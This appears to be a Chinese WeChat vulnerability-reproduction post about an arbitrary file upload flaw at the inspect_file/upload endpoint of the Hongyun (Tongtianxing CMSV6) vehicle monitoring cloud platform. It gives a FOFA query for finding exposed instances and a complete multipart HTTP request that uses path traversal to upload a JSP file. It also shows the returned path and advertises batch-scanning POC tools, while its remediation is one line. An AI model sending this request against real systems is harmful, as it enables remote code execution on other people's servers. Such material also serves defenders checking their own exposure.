#  鸿运(通天星CMSV6车载)主动安全监控云平台inspect_file/upload存在任意文件上传漏洞   
南风徐来  南风漏洞复现文库   2024-04-03 23:53  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. 鸿运(通天星CMSV6车载)主动安全监控云平台inspect_file/upload简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
鸿运(通天星CMSV6车载)主动安全监控云平台实现对计算资源、存储资源、网络资源、云应用服务进行7*24小时全时区、多地域、全方位、立体式、智能化的IT运维监控，保障IT系统安全、稳定、可靠运行。  
## 2.漏洞描述  
  
鸿运主动安全监控云平台实现对计算资源、存储资源、网络资源、云应用服务进行7*24小时全时区、多地域、全方位、立体式、智能化的IT运维监控，保障IT系统安全、稳定、可靠运行。鸿运(通天星CMSV6车载)主动安全监控云平台存在任意文件上传漏洞。  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
鸿运(通天星CMSV6车载)主动安全监控云平台  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aF4ad5nuHyx6jleeRyicMfyDGZ359FCzfPGzRsgteVGtm0cdQzVIdqg4g22QeyKUyfILA6p8BBCOQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
鸿运(通天星CMSV6车载)主动安全监控云平台inspect_file/upload存在任意文件上传漏洞  
## 4.fofa查询语句  
  
body="./open/webApi.html"||body="/808gps/"  
## 5.漏洞复现  
  
漏洞链接：https://127.0.0.1/inspect_file/upload  
  
漏洞数据包：  
```
POST /inspect_file/upload HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Length: 226
Content-Type: multipart/form-data; boundary=2e7688d712bcc913201f327059f9976b

--2e7688d712bcc913201f327059f9976b
Content-Disposition: form-data; name="uploadFile"; filename="../707140.jsp"
Content-Type: application/octet-stream

<% out.println("007319607"); %>
--2e7688d712bcc913201f327059f9976b--

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aF4ad5nuHyx6jleeRyicMfy6fDqTmZTSXBtK9wkL43gWJFW35ytQSeEgWJQguTyMbJpu7K41jtWsw/640?wx_fmt=jpeg&from=appmsg "null")  
  
上传成功后，会返回路径  
  
 https://127.0.0.1/upload/software/1429273988861305_707140.jsp  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aF4ad5nuHyx6jleeRyicMfyYiaRGf3y6KUAUGIIPdNbb912OicicSRpCYQUeicsW1hziaDHP0UVHKFZ5Aw/640?wx_fmt=jpeg&from=appmsg "null")  
## 6.POC&EXP  
  
关注公众号 南风漏洞复现文库 并回复 漏洞复现114 即可获得该POC工具下载地址：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aF4ad5nuHyx6jleeRyicMfyvjdevWzlZXWkib95jpjePNa9NFEtjmCicte5m5jpNCDNb4KyUBgWJiaoQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。2: 免登录，免费fofa查询。3: 更新其他实用网络安全工具项目。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aF4ad5nuHyx6jleeRyicMfyw4d9zXmJq7BJDQ6qSpibiapulNeDicgsIwZDCb1wnu6ibAJ34l4DwU9RicQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aF4ad5nuHyx6jleeRyicMfy1GNXxXUYF10SJoMibmibEqjxj5nxibwTbyrN7QIUMWn3Jnl7riad2Jt4Zw/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aF4ad5nuHyx6jleeRyicMfyoHoRIdFTFVYFWcWkSq6FLRl3oibq6LMZmV4uficnfmPJJUEdyNy8K2tw/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aF4ad5nuHyx6jleeRyicMfy9UOialtQtGcehWabic6QvUlJekSSaasBlW07BmqGcYhPofvIejAkAK9Q/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aF4ad5nuHyx6jleeRyicMfytU9PT0ojicRtL1lCUm2ktEuAmazVZicMaAVGlp2ibvY6NezVlSf2stzyg/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aF4ad5nuHyx6jleeRyicMfyPfmEs2IWEaiaPOkeqicc0on2Hpw3xKYK23icsZ7op4beenAK7CMPAqjoA/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
请联系厂商打补丁或者升级到最新版本。  
## 8.往期回顾  
  
[用友U8-Cloud FileServlet接口存在任意文件读取漏洞](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247485971&idx=1&sn=1ff418faefa7d29d963287d2dcc9484f&chksm=974b8714a03c0e022db2152ca5aede423908c66bdc70e58877c80847c0d8455ad20f29c6fe25&scene=21#wechat_redirect)  
  
  
[联达OA UpLoadFile.aspx接口存在任意文件上传漏洞](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247485971&idx=2&sn=1eb9e5a46400b4cc7397129578694b26&chksm=974b8714a03c0e028917c431a4e31adbf529ba070ed3891e9552754244925d36f50c95d18947&scene=21#wechat_redirect)  
  
  
  
  
